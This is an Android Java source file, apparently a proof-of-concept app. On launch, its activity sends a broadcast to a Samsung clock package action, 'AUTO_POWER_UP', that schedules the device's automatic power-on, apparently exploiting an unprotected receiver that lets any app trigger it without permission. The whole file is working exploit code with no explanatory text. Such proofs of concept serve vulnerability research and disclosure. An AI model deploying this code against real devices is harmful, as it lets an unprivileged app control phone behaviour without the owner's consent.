package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.SystemClock;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.sec.android.clockpackage.AUTO_POWER_UP");
        i.putExtra("Alarm_Power_Up_Time", SystemClock.currentThreadTimeMillis() + 15 * 60 * 1000);
        sendBroadcast(i);
    }
}